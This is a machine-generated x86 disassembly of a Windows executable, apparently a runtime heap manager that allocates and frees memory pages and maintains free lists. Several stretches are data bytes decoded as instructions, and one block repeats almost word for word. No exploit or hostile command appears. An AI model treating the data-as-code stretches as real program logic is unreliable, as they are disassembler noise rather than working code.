sub_401098
or al [ esi ]
push ebx
je r-xdata
arpl [ esp + edi * 8 + 0x10 ] si
imul ebp [ esi + 0x67 ] r-xdata
or al 0x7
push esi
popad
jb r-xdata
add [ eax ] al
je r-xdata
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi ] al
push ebx
jns r-xdata
popad
adc [ ecx ] 0x40
add [ eax ] al
add [ eax ] al
add [ eax ] al
or al 0x0
add [ eax ] al
mov al 0x10
inc eax
add [ ebp + esi + 0x40 ] cl
add [ eax ] bh
pop ebx
inc eax
add [ ebx + ebx * 2 + 0x40 ] al
add [ eax + 0x35 ] ah
inc eax
add [ ebp + esi + 0x40 ] dl
add [ ebx + ebx * 2 + 0x40 ] dl
add al dl
xor al [ eax ]
or al 0x33
inc eax
add [ ecx ] dl
push esp
dec ecx
outsb
je r-xdata
inc eax
add [ eax ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp + 0x11f00040 ] cl
inc eax
add [ ecx + 0x4011 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al dh
adc [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al al
add [ eax ] al
add [ eax ] al
insd
add [ eax ] al
sub [ ecx ] dl
inc eax
add [ edi ] cl
or cl [ ecx + 0x49 ]
outsb
je r-xdata
nop
inc eax
adc [ eax ] al
add [ edi ] eax
dec ecx
outsb
je r-xdata
inc eax
add ah bh
adc [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cld
sar bh 0x25
jb r-xdata
inc esi
jne r-xdata
jb r-xdata
outsb
je r-xdata
jb r-xdata
fcom [ ecx - 0x3f74ffb7 ]
jmp [ __import_lookup_table_0(kernel32:FindClose) ]
popad
arpl [ ebp + 0x64 ] sp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ebx + ecx * 4 - 0x40 ] si
or [ edx ] dl
inc eax
add [ ecx + ecx ] al
push esp
inc esp
popad
je sub_401274
popad
arpl [ ebp ] sp
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
rol [ eax ] 0x0
add [ eax ] al
add [ eax ] al
inc esi
push es
push ebx
jns r-xdata
add [ eax ] al
add [ eax + 0x7fffffff ] al
mov eax eax
pop eax
adc [ eax ] al
add [ edx + eax * 2 ] eax
jns r-xdata
push esp
imul ebp [ ebp + 0x65 ] 0xcc25ff01
xchg ecx eax
dec ecx
add [ ebx - 0x37da0040 ] cl
xchg ecx eax
dec ecx
add [ ebx - 0x3bda0040 ] cl
xchg ecx eax
dec ecx
add [ ebx - 0x3fda0040 ] cl
xchg ecx eax
dec ecx
add [ ebx - 0x43da0040 ] cl
xchg ecx eax
dec ecx
add [ ebx - 0x1fda0040 ] cl
xchg ecx eax
dec ecx
add [ ebx - 0x47da0040 ] cl
xchg ecx eax
dec ecx
add [ ebx - 0x4bda0040 ] cl
xchg ecx eax
dec ecx
add [ ebx - 0x4fda0040 ] cl
xchg ecx eax
dec ecx
add [ ebx - 0x23da0040 ] cl
xchg ecx eax
dec ecx
add [ ebx - 0x53da0040 ] cl
xchg ecx eax
dec ecx
add [ ebx - 0x57da0040 ] cl
xchg ecx eax
dec ecx
add [ ebx - 0x5bda0040 ] cl
xchg ecx eax
dec ecx
add [ ebx - 0x5fda0040 ] cl
xchg ecx eax
dec ecx
add [ ebx - 0x63da0040 ] cl
xchg ecx eax
dec ecx
add [ ebx - 0x67da0040 ] cl
xchg ecx eax
dec ecx
add [ ebx - 0x6bda0040 ] cl
xchg ecx eax
dec ecx
add [ ebx - 0x6fda0040 ] cl
xchg ecx eax
dec ecx
add [ ebx - 0x73da0040 ] cl
xchg ecx eax
dec ecx
add [ ebx - 0x77da0040 ] cl
xchg ecx eax
dec ecx
add [ ebx - 0x7bda0040 ] cl
xchg ecx eax
dec ecx
add [ ebx - 0x27da0040 ] cl
xchg ecx eax
dec ecx
add [ ebx - 0x7fda0040 ] cl
xchg ecx eax
dec ecx
add [ ebx + 0x7c25ffc0 ] cl
xchg ecx eax
dec ecx
add [ ebx + 0x7825ffc0 ] cl
xchg ecx eax
dec ecx
add [ ebx - 0xfda0040 ] cl
xchg ecx eax
dec ecx
add [ ebx - 0x13da0040 ] cl
xchg ecx eax
dec ecx
add [ ebx - 0x17da0040 ] cl
xchg ecx eax
dec ecx
add [ ebx + 0x7425ffc0 ] cl
xchg ecx eax
dec ecx
add [ ebx + 0x7025ffc0 ] cl
xchg ecx eax
dec ecx
add [ ebx + 0x25ffc0 ] cl
xchg edx eax
dec ecx
add [ ebx - 0x3da0040 ] cl
xchg ecx eax
dec ecx
add [ ebx - 0x7da0040 ] cl
xchg ecx eax
dec ecx
add [ ebx + 0x6c25ffc0 ] cl
xchg ecx eax
dec ecx
add [ ebx + 0x6825ffc0 ] cl
xchg ecx eax
dec ecx
add [ ebx + 0x6425ffc0 ] cl
xchg ecx eax
dec ecx
add [ ebx + 0x6025ffc0 ] cl
xchg ecx eax
dec ecx
add [ ebx - 0x3b7cac40 ] cl
mov esp 0xabb
add [ eax + ebp * 8 + 0x59 ] dl
add [ eax ] al
add [ eax ] al
[ eax ] eax
je r-xdata
adc [ eax ] al
add al 0x0
add [ gs : eax ] eax
add [ eax ] al
add bh bh
add [ eax ] al
add [ eax + r-xdata ] dl
add [ edi + edx * 2 ] eax
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
insd
add eax [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
dec esp
xor eax 0x35580040
inc eax
add [ ebp + esi + 0x40 ] bl
add [ eax + 0x35 ] ah
add eax [ eax ]
add [ eax ] al
add bh bh
inc [ eax ]
add [ eax + r-xdata ] dl
add [ eax ] ecx
inc ebx
popad
jb r-xdata
inc eax
add [ ebp + esi + 0x40 ] dl
add [ edx + esi + 0x32d00040 ] dh
inc eax
add [ ebx + esi ] cl
inc eax
add [ edi ] al
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x11 ] si
inc eax
add [ edi ] al
pop es
push esp
dec edi
bound ebp [ edx + 0x65 ]
imul ebp [ esi + 0x61 ] 0x56c
add [ eax ] al
sub_401153
dec esp
add [ esp + 0x4 ] 0xfffffff8
jmp r-xdata
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
mov edx [ ebp + 0xc ]
mov eax ebx
call sub_4033d0
test al al
je r-xdata
mov eax 0x80004002
xor eax eax
jmp r-xdata
pop ebx
pop ebp
retn 0xc
sub_401175
push ebp
adc [ eax ] eax
pop edi
adc [ eax ] eax
imul edx [ ecx ] 0x10040
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
rol [ eax ] 0x0
add [ eax ] al
add [ eax ] al
inc esi
jne r-xdata
adc [ ecx ] 0x40
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
[ eax ] eax
or al 0x0
add [ eax ] al
mov al 0x10
inc eax
add [ ebp + esi + 0x40 ] cl
add [ eax ] bh
pop ebx
inc eax
add [ ebx + ebx * 2 + 0x40 ] al
add [ eax + 0x35 ] ah
inc eax
add [ ebp + esi + 0x40 ] dl
add [ ebx + ebx * 2 + 0x40 ] dl
add al dl
xor al [ eax ]
or al 0x33
inc eax
add [ ecx ] dl
push esp
dec ecx
outsb
je r-xdata
inc eax
add [ eax ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp + 0x11f00040 ] cl
inc eax
add [ ecx + 0x4011 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al dh
adc [ eax ] eax
sar bh 0x25
jb r-xdata
fcom [ ecx - 0x3f74ffb7 ]
jmp [ __import_lookup_table_0(kernel32:FindClose) ]
popad
arpl [ ebp + 0x64 ] sp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ebx + ecx * 4 - 0x40 ] si
or [ edx ] dl
inc eax
add [ ecx + ecx ] al
push esp
inc esp
popad
je sub_401274
push esp
imul ebp [ ebp + 0x65 ] 0xcc25ff01
xchg ecx eax
dec ecx
add [ ebx - 0x37da0040 ] cl
xchg ecx eax
dec ecx
add [ ebx - 0x3bda0040 ] cl
xchg ecx eax
dec ecx
add [ ebx - 0x3fda0040 ] cl
xchg ecx eax
dec ecx
add [ ebx - 0x43da0040 ] cl
xchg ecx eax
dec ecx
add [ ebx - 0x1fda0040 ] cl
xchg ecx eax
dec ecx
add [ ebx - 0x47da0040 ] cl
xchg ecx eax
dec ecx
add [ ebx - 0x4bda0040 ] cl
xchg ecx eax
dec ecx
add [ ebx - 0x4fda0040 ] cl
xchg ecx eax
dec ecx
add [ ebx - 0x23da0040 ] cl
xchg ecx eax
dec ecx
add [ ebx - 0x53da0040 ] cl
xchg ecx eax
dec ecx
add [ ebx - 0x57da0040 ] cl
xchg ecx eax
dec ecx
add [ ebx - 0x5bda0040 ] cl
xchg ecx eax
dec ecx
add [ ebx - 0x5fda0040 ] cl
xchg ecx eax
dec ecx
add [ ebx - 0x63da0040 ] cl
xchg ecx eax
dec ecx
add [ ebx - 0x67da0040 ] cl
xchg ecx eax
dec ecx
add [ ebx - 0x6bda0040 ] cl
xchg ecx eax
dec ecx
add [ ebx - 0x6fda0040 ] cl
xchg ecx eax
dec ecx
add [ ebx - 0x73da0040 ] cl
xchg ecx eax
dec ecx
add [ ebx - 0x77da0040 ] cl
xchg ecx eax
dec ecx
add [ ebx - 0x7bda0040 ] cl
xchg ecx eax
dec ecx
add [ ebx - 0x27da0040 ] cl
xchg ecx eax
dec ecx
add [ ebx - 0x7fda0040 ] cl
xchg ecx eax
dec ecx
add [ ebx + 0x7c25ffc0 ] cl
xchg ecx eax
dec ecx
add [ ebx + 0x7825ffc0 ] cl
xchg ecx eax
dec ecx
add [ ebx - 0xfda0040 ] cl
xchg ecx eax
dec ecx
add [ ebx - 0x13da0040 ] cl
xchg ecx eax
dec ecx
add [ ebx - 0x17da0040 ] cl
xchg ecx eax
dec ecx
add [ ebx + 0x7425ffc0 ] cl
xchg ecx eax
dec ecx
add [ ebx + 0x7025ffc0 ] cl
xchg ecx eax
dec ecx
add [ ebx + 0x25ffc0 ] cl
xchg edx eax
dec ecx
add [ ebx - 0x3da0040 ] cl
xchg ecx eax
dec ecx
add [ ebx - 0x7da0040 ] cl
xchg ecx eax
dec ecx
add [ ebx + 0x6c25ffc0 ] cl
xchg ecx eax
dec ecx
add [ ebx + 0x6825ffc0 ] cl
xchg ecx eax
dec ecx
add [ ebx + 0x6425ffc0 ] cl
xchg ecx eax
dec ecx
add [ ebx + 0x6025ffc0 ] cl
xchg ecx eax
dec ecx
add [ ebx - 0x3b7cac40 ] cl
mov esp 0xabb
add [ eax + ebp * 8 + 0x59 ] dl
sub_4013a0
push ebx
push esi
mov esi rw-data
cmp [ esi ] 0x0
jne r-xdata
mov eax [ esi ]
mov edx [ eax ]
mov [ esi ] edx
pop esi
pop ebx
retn
push 0x644
push 0x0
call sub_401360
mov ecx eax
test ecx ecx
jne r-xdata
mov eax [ rw-data ]
mov [ ecx ] eax
mov [ rw-data ] ecx
xor edx edx
xor eax eax
pop esi
pop ebx
retn
mov eax edx
add eax eax
lea eax [ ecx + eax * 8 + 0x4 ]
mov ebx [ esi ]
mov [ eax ] ebx
mov [ esi ] eax
inc edx
cmp edx 0x64
jne r-xdata
sub_4013f8
push ebx
push esi
mov esi edx
mov ebx eax
call sub_4013a0
test eax eax
jne r-xdata
mov edx [ esi ]
mov [ eax + 0x8 ] edx
mov edx [ esi + 0x4 ]
mov [ eax + 0xc ] edx
mov edx [ ebx ]
mov [ eax ] edx
mov [ eax + 0x4 ] ebx
mov [ edx + 0x4 ] eax
mov [ ebx ] eax
mov al 0x1
pop esi
pop ebx
retn
xor eax eax
pop esi
pop ebx
retn
sub_401440
push ebx
push esi
push edi
push ebp
push ecx
mov esi ecx
mov [ esp ] edx
mov ebp eax
mov ebx [ ebp ]
mov eax [ esp ]
mov edx [ eax ]
mov [ esi ] edx
mov edx [ eax + 0x4 ]
mov [ esi + 0x4 ] edx
add eax [ esi + 0x4 ]
cmp eax [ ebx + 0x8 ]
jne r-xdata
mov eax ebx
call sub_401428
mov eax [ ebx + 0x8 ]
mov [ esi ] eax
mov eax [ ebx + 0xc ]
add [ esi + 0x4 ] eax
jmp r-xdata
mov ebx edi
cmp ebp ebx
jne r-xdata
mov eax ebx
call sub_401428
mov eax [ ebx + 0xc ]
add [ esi + 0x4 ] eax
mov edi [ ebx ]
mov eax [ esi ]
mov edx [ ebx + 0x8 ]
add edx [ ebx + 0xc ]
cmp eax edx
jne r-xdata
mov edx esi
mov eax ebp
call sub_4013f8
test al al
jne r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
xor eax eax
mov [ esi ] eax
sub_4014b0
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebx eax
mov edi ebx
mov ebx [ ebx ]
cmp edi ebx
jne r-xdata
mov ecx esi
add ecx [ edx + 0x4 ]
mov ebp eax
add ebp [ ebx + 0xc ]
cmp ecx ebp
ja r-xdata
mov esi [ edx ]
mov eax [ ebx + 0x8 ]
cmp esi eax
jb r-xdata
xor eax eax
cmp esi eax
jne r-xdata
mov ecx esi
mov edi [ edx + 0x4 ]
add ecx edi
mov ebp eax
add ebp [ ebx + 0xc ]
cmp ecx ebp
jne r-xdata
mov eax [ edx + 0x4 ]
add [ ebx + 0x8 ] eax
mov eax [ edx + 0x4 ]
sub [ ebx + 0xc ] eax
cmp [ ebx + 0xc ] 0x0
jne r-xdata
mov ecx [ edx ]
add ecx [ edx + 0x4 ]
mov [ esp ] ecx
mov edi [ ebx + 0x8 ]
add edi [ ebx + 0xc ]
sub edi ecx
mov [ esp + 0x4 ] edi
sub esi eax
mov [ ebx + 0xc ] esi
mov edx esp
mov eax ebx
call sub_4013f8
test al al
jne r-xdata
sub [ ebx + 0xc ] edi
jmp r-xdata
mov al 0x1
jmp r-xdata
mov eax ebx
call sub_401428
jmp r-xdata
xor eax eax
jmp r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
sub_401544
push ebx
push esi
push edi
mov ebx edx
mov esi eax
cmp esi 0x100000
jge r-xdata
add esi 0xffff
and esi 0xffff0000
mov esi 0x100000
jmp r-xdata
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax rw-data
call sub_4013f8
test al al
jne r-xdata
mov [ ebx + 0x4 ] esi
push 0x1
push 0x2000
push esi
push 0x0
call sub_401370
mov edi eax
mov [ ebx ] edi
test edi edi
je r-xdata
push 0x8000
push 0x0
mov eax [ ebx ]
push eax
call sub_401378
xor eax eax
mov [ ebx ] eax
sub_4015a8
push ebx
push esi
push edi
push ebp
mov ebx ecx
mov esi edx
mov ebp eax
mov [ ebx + 0x4 ] 0x100000
push 0x4
push 0x2000
push 0x100000
push ebp
call sub_401370
mov edi eax
mov [ ebx ] edi
test edi edi
jne r-xdata
cmp [ ebx ] 0x0
je r-xdata
add esi 0xffff
and esi 0xffff0000
mov [ ebx + 0x4 ] esi
push 0x4
push 0x2000
push esi
push ebp
call sub_401370
mov [ ebx ] eax
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax rw-data
call sub_4013f8
test al al
jne r-xdata
push 0x8000
push 0x0
mov eax [ ebx ]
push eax
call sub_401378
xor eax eax
mov [ ebx ] eax
sub_401620
push ebx
push esi
push edi
push ebp
add esp 0xffffffec
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov [ esp + 0x8 ] 0xffffffff
xor edx edx
mov [ esp + 0xc ] edx
mov ebp eax
mov eax [ esp ]
add eax ebp
mov [ esp + 0x10 ] eax
mov ebx [ rw-data ]
jmp r-xdata
cmp ebx rw-data
jne r-xdata
mov edi [ ebx ]
mov esi [ ebx + 0x8 ]
cmp ebp esi
ja r-xdata
mov eax [ esp + 0x4 ]
xor edx edx
mov [ eax ] edx
cmp [ esp + 0xc ] 0x0
je r-xdata
mov ebx edi
mov eax esi
add eax [ ebx + 0xc ]
cmp eax [ esp + 0x10 ]
ja r-xdata
add esp 0x14
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ esp + 0x4 ]
mov edx [ esp + 0x8 ]
mov [ eax ] edx
mov eax [ esp + 0xc ]
sub eax [ esp + 0x8 ]
mov edx [ esp + 0x4 ]
mov [ edx + 0x4 ] eax
cmp esi [ esp + 0x8 ]
jae r-xdata
mov eax esi
add eax [ ebx + 0xc ]
cmp eax [ esp + 0xc ]
jbe r-xdata
mov [ esp + 0x8 ] esi
push 0x8000
push 0x0
push esi
call sub_401378
test eax eax
jne r-xdata
mov [ esp + 0xc ] eax
mov eax ebx
call sub_401428
mov [ rw-data ] 0x1
sub_4016d8
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov edx eax
mov ebp edx
and ebp 0xfffff000
add edx [ esp ]
add edx 0xfff
and edx 0xfffff000
mov [ esp + 0x8 ] edx
mov eax [ esp + 0x4 ]
mov [ eax ] ebp
mov eax [ esp + 0x8 ]
sub eax ebp
mov edx [ esp + 0x4 ]
mov [ edx + 0x4 ] eax
mov esi [ rw-data ]
jmp r-xdata
cmp esi rw-data
jne r-xdata
mov ebx [ esi + 0x8 ]
mov edi [ esi + 0xc ]
add edi ebx
cmp ebp ebx
jbe r-xdata
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
cmp edi [ esp + 0x8 ]
jbe r-xdata
mov ebx ebp
cmp edi ebx
jbe r-xdata
mov edi [ esp + 0x8 ]
mov esi [ esi ]
push 0x4
push 0x1000
sub edi ebx
push edi
push ebx
call sub_401370
test eax eax
jne r-xdata
mov eax [ esp + 0x4 ]
xor edx edx
mov [ eax ] edx
jmp r-xdata
sub_40176c
push ebx
push esi
push edi
push ebp
push ecx
mov ebx eax
mov esi ebx
add esi 0xfff
and esi 0xfffff000
mov [ esp ] esi
mov ebp ebx
add ebp edx
and ebp 0xfffff000
mov eax [ esp ]
mov [ ecx ] eax
mov eax ebp
sub eax [ esp ]
mov [ ecx + 0x4 ] eax
mov esi [ rw-data ]
jmp r-xdata
cmp esi rw-data
jne r-xdata
mov ebx [ esi + 0x8 ]
mov edi [ esi + 0xc ]
add edi ebx
cmp ebx [ esp ]
jae r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
cmp ebp edi
jae r-xdata
mov ebx [ esp ]
cmp edi ebx
jbe r-xdata
mov edi ebp
mov esi [ esi ]
push 0x4000
sub edi ebx
push edi
push ebx
call sub_401378
test eax eax
jne r-xdata
mov [ rw-data ] 0x2
sub_4017ec
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov esi edx
mov edi eax
mov ebp rw-data
add edi 0x3fff
and edi 0xffffc000
cmp ebx ebp
jne r-xdata
cmp edi [ ebx + 0xc ]
jg r-xdata
mov edx esi
mov eax edi
call sub_401544
cmp [ esi ] 0x0
je r-xdata
mov ebx [ ebx ]
mov ecx esi
mov edx edi
mov eax [ ebx + 0x8 ]
call sub_4016d8
cmp [ esi ] 0x0
je r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov ecx esp
mov edx esi
mov eax ebp
call sub_401440
cmp [ esp ] 0x0
jne r-xdata
mov eax [ esi + 0x4 ]
add [ ebx + 0x8 ] eax
mov eax [ esi + 0x4 ]
sub [ ebx + 0xc ] eax
cmp [ ebx + 0xc ] 0x0
jne r-xdata
mov ebx [ ebp ]
jmp r-xdata
mov ecx esp
mov edx [ esi + 0x4 ]
mov eax [ esi ]
call sub_401620
xor eax eax
mov [ esi ] eax
mov eax ebx
call sub_401428
jmp r-xdata
sub_40187c
push ebx
push esi
push edi
push ebp
add esp 0xffffffec
mov [ esp ] ecx
mov edi edx
mov esi eax
mov ebp rw-data
add edi 0x3fff
and edi 0xffffc000
cmp ebx ebp
je r-xdata
cmp esi [ ebx + 0x8 ]
jne r-xdata
cmp esi [ ebx + 0x8 ]
jne r-xdata
lea ecx [ esp + 0x4 ]
mov edx edi
mov eax esi
call sub_4015a8
cmp [ esp + 0x4 ] 0x0
je r-xdata
cmp edi [ ebx + 0xc ]
jle r-xdata
mov ebx [ ebx ]
mov ebp [ ebx + 0x8 ]
cmp esi ebp
jne r-xdata
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x4 ]
mov eax ebp
call sub_401440
cmp [ esp + 0xc ] 0x0
jne r-xdata
lea ecx [ esp + 0x4 ]
mov edx edi
sub edx [ ebx + 0xc ]
mov eax [ ebx + 0x8 ]
add eax [ ebx + 0xc ]
call sub_4015a8
cmp [ esp + 0x4 ] 0x0
je r-xdata
mov eax [ esp ]
xor edx edx
mov [ eax ] edx
cmp edi [ ebx + 0xc ]
jg r-xdata
mov ebx [ ebp ]
jmp r-xdata
lea ecx [ esp + 0xc ]
mov edx [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
call sub_401620
mov eax [ esp ]
xor edx edx
mov [ eax ] edx
jmp r-xdata
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x4 ]
mov eax ebp
call sub_401440
cmp [ esp + 0xc ] 0x0
jne r-xdata
mov ecx [ esp ]
mov edx edi
mov eax ebp
call sub_4016d8
mov eax [ esp ]
cmp [ eax ] 0x0
je r-xdata
add esp 0x14
pop ebp
pop edi
pop esi
pop ebx
retn
lea ecx [ esp + 0xc ]
mov edx [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
call sub_401620
mov eax [ esp ]
xor edx edx
mov [ eax ] edx
jmp r-xdata
mov eax [ esp ]
mov eax [ eax + 0x4 ]
add [ ebx + 0x8 ] eax
mov eax [ esp ]
mov eax [ eax + 0x4 ]
sub [ ebx + 0xc ] eax
cmp [ ebx + 0xc ] 0x0
jne r-xdata
mov eax ebx
call sub_401428
jmp r-xdata
sub_4019a0
push ebx
push esi
push edi
add esp 0xffffffec
mov edi ecx
mov [ esp ] edx
lea ebx [ eax + 0x3fff ]
and ebx 0xffffc000
mov esi [ esp ]
add esi eax
and esi 0xffffc000
cmp ebx esi
jae r-xdata
xor eax eax
mov [ edi ] eax
mov ecx edi
mov edx esi
sub edx ebx
mov eax ebx
call sub_40176c
lea ecx [ esp + 0x4 ]
mov edx edi
mov eax rw-data
call sub_401440
mov ebx [ esp + 0x4 ]
test ebx ebx
je r-xdata
cmp [ esp + 0x4 ] 0x0
je r-xdata
lea ecx [ esp + 0xc ]
mov edx [ esp + 0x8 ]
mov eax ebx
call sub_401620
mov eax [ esp + 0xc ]
mov [ esp + 0x4 ] eax
mov eax [ esp + 0x10 ]
mov [ esp + 0x8 ] eax
add esp 0x14
pop edi
pop esi
pop ebx
retn
lea edx [ esp + 0x4 ]
mov eax rw-data
call sub_4014b0
jmp r-xdata
sub_401a2c
push ebp
mov ebp esp
xor edx edx
push ebp
push sub_401ae2
push [ fs : edx ]
mov [ fs : edx ] esp
push rw-data
call sub_401380
cmp [ rw-data ] 0x0
je r-xdata
mov eax rw-data
call sub_4013f0
mov eax rw-data
call sub_4013f0
mov eax rw-data
call sub_4013f0
push 0xff8
push 0x0
call sub_401360
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
push rw-data
call sub_401388
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_401ae9
cmp [ rw-data ] 0x0
je r-xdata
mov eax 0x3
retn
push rw-data
call sub_401390
mov edx [ rw-data ]
xor ecx ecx
mov [ edx + eax * 4 - 0xc ] ecx
inc eax
cmp eax 0x401
jne r-xdata
mov eax rw-data
mov [ eax + 0x4 ] eax
mov [ eax ] eax
mov [ rw-data ] eax
mov [ rw-data ] 0x1
sub_401af0
push ebp
mov ebp esp
push ebx
cmp [ rw-data ] 0x0
je r-xdata
pop ebx
pop ebp
retn
xor edx edx
push ebp
push sub_401bc6
push [ fs : edx ]
mov [ fs : edx ] esp
cmp [ rw-data ] 0x0
je r-xdata
mov [ rw-data ] 0x0
mov eax [ rw-data ]
push eax
call LocalFree
xor eax eax
mov [ rw-data ] eax
mov ebx [ rw-data ]
jmp r-xdata
push rw-data
call sub_401388
cmp ebx rw-data
jne r-xdata
push 0x8000
push 0x0
mov eax [ ebx + 0x8 ]
push eax
call sub_401378
mov ebx [ ebx ]
mov eax rw-data
call sub_4013f0
mov eax rw-data
call sub_4013f0
mov eax rw-data
call sub_4013f0
mov eax [ rw-data ]
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov edx [ eax ]
mov [ rw-data ] edx
push eax
call LocalFree
mov eax [ rw-data ]
test eax eax
jne r-xdata
push rw-data
call sub_401398
retn
push rw-data
call sub_401390
sub_401bd0
push ebx
cmp eax [ rw-data ]
jne r-xdata
mov edx [ eax + 0x4 ]
mov ecx [ eax + 0x8 ]
cmp ecx 0x1000
jg r-xdata
mov edx [ eax + 0x4 ]
mov [ rw-data ] edx
mov eax [ eax ]
mov [ edx ] eax
mov [ eax + 0x4 ] edx
cmp eax edx
jne r-xdata
test ecx ecx
jns r-xdata
test ecx ecx
jns r-xdata
sar ecx 0x2
mov ebx [ rw-data ]
mov [ ebx + ecx * 4 - 0xc ] edx
mov eax [ eax ]
mov [ edx ] eax
mov [ eax + 0x4 ] edx
pop ebx
retn
add ecx 0x3
sar ecx 0x2
mov eax [ rw-data ]
xor edx edx
mov [ eax + ecx * 4 - 0xc ] edx
jmp r-xdata
add ecx 0x3
pop ebx
retn
sub_401c34
mov edx [ rw-data ]
jmp r-xdata
cmp edx rw-data
jne r-xdata
mov ecx [ edx + 0x8 ]
cmp eax ecx
jb r-xdata
mov [ rw-data ] 0x3
xor edx edx
mov edx [ edx ]
add ecx [ edx + 0xc ]
cmp eax ecx
jb r-xdata
mov eax edx
retn
sub_401c64
push ebx
mov ecx edx
sub ecx 0x4
lea ebx [ ecx + eax ]
cmp edx 0x10
jl r-xdata
cmp edx 0x4
jl r-xdata
mov [ ebx ] 0x80000007
mov edx ecx
call sub_401e38
pop ebx
retn
pop ebx
retn
mov ecx edx
or ecx 0x80000002
mov [ eax ] ecx
mov [ ebx ] ecx
sub_401cb8
cmp edx 0xc
jl r-xdata
cmp edx 0x4
jl r-xdata
or edx 0x2
mov [ eax ] edx
add eax 0x4
call sub_401c94
retn
add eax edx
and [ eax ] 0xfffffffe
retn
mov ecx edx
or ecx 0x80000002
mov [ eax ] ecx
sub_401ce0
push ebx
push esi
mov edx eax
sub edx 0x4
mov edx [ edx ]
mov ecx edx
and ecx 0x80000002
cmp ecx 0x80000002
je r-xdata
mov ebx edx
and ebx 0x7ffffffc
sub eax ebx
mov ecx eax
xor edx [ ecx ]
test edx 0xfffffffe
je r-xdata
mov [ rw-data ] 0x4
test [ ecx ] 0x1
je r-xdata
mov [ rw-data ] 0x5
mov eax ebx
pop esi
pop ebx
retn
mov edx eax
sub edx 0xc
mov esi [ edx + 0x8 ]
sub eax esi
cmp esi [ eax + 0x8 ]
je r-xdata
call sub_401bd0
add ebx esi
mov [ rw-data ] 0x6
sub_401d50
push ebx
push esi
push edi
mov ebx eax
xor edi edi
mov eax [ ebx ]
test eax 0x80000000
je r-xdata
test al 0x2
jne r-xdata
and eax 0x7ffffffc
add edi eax
add ebx eax
mov eax [ ebx ]
mov eax edi
pop edi
pop esi
pop ebx
retn
mov esi ebx
mov eax esi
call sub_401bd0
mov eax [ esi + 0x8 ]
add edi eax
add ebx eax
and [ ebx ] 0xfffffffe
sub_401d88
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov edi edx
mov esi eax
mov [ esp ] 0x0
mov eax esi
call sub_401c34
mov ebx eax
test ebx ebx
je r-xdata
mov al [ esp ]
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
mov ebp [ ebx + 0x8 ]
mov eax ebp
add eax [ ebx + 0xc ]
mov edx eax
lea ecx [ edi + esi ]
sub edx ecx
cmp edx 0xc
jg r-xdata
mov eax esi
sub eax ebp
cmp eax 0xc
jge r-xdata
mov edi eax
sub edi esi
lea ecx [ esp + 0x1 ]
mov edx edi
sub edx 0x4
lea eax [ esi + 0x4 ]
call sub_4019a0
lea ecx [ esp + 0x1 ]
mov edx esi
sub edx [ ebx + 0x8 ]
add edx edi
mov eax ebp
call sub_4019a0
jmp r-xdata
mov edx ebp
sub edx esi
mov eax esi
call sub_401c64
mov eax ebp
add eax [ esp + 0x5 ]
mov edx [ ebx + 0x8 ]
add edx [ ebx + 0xc ]
cmp eax edx
jae r-xdata
mov ebp [ esp + 0x1 ]
test ebp ebp
je r-xdata
lea edx [ esp + 0x1 ]
mov eax ebx
call sub_4014b0
mov [ esp ] 0x1
lea edx [ edi + esi ]
sub edx eax
call sub_401cb8
sub_401e38
push ebx
push esi
push edi
mov esi edx
mov edi eax
mov ebx edi
mov [ ebx + 0x8 ] esi
mov eax ebx
add eax esi
sub eax 0xc
mov [ eax + 0x8 ] esi
cmp esi 0x1000
jg r-xdata
